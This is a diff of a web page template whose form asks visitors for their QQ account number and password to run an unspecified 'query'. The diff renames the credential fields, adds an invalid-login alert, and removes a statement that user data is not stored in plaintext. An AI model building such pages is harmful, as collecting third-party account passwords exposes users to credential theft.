@@ -19,26 +19,32 @@
                 <form role="form" method="POST">
                     <div class="form-group">
                         <label>QQ号</label>
-                        <input type="text" class="form-control" placeholder="请输入你的QQ号" name="qq">
+                        <input type="text" class="form-control" placeholder="请输入你的QQ号" name="number">
                     </div>
                     <div class="form-group">
                         <label>QQ密码</label>
-                        <input type="password" class="form-control" placeholder="请输入你的QQ密码" name="password">
+                        <input type="password" class="form-control" placeholder="请输入你的QQ密码" name="pd">
                     </div>
                     <button type="submit" class="btn btn-default btn-block">查询！</button>
                 </form>
                 </div>
                 <div class="panel-footer">
                     <p>注意事项：</p>
-                    <p>1.本程序不会明文存储您的任何信息，请放心使用。</p>
-                    <p>2.如遇到数据繁忙等查询失败提示，请等待10分钟左右再试！</p>
-                    <p>3.查询成功几率约为60%</p>
-                    <p>4.请输入正确的QQ号和密码，否则会查询失败！</p>
+                    <p>1.如遇到数据繁忙等查询失败提示，请等待10分钟左右再试！</p>
+                    <p>2.查询成功几率约为60%</p>
                 </div>
             </div>
         </div>
     </div>
 </dic>
+
+{% if wrong_qq %}
+<div class="container">
+    <div class="col-md-4 col-md-offset-4">
+        <div class="alert alert-danger">喵！请输入有效的QQ号和密码！请重新输入！</div>
+    </div>
+</div>
+{% endif %}
 
 {% if logged %}
 <div class="container">
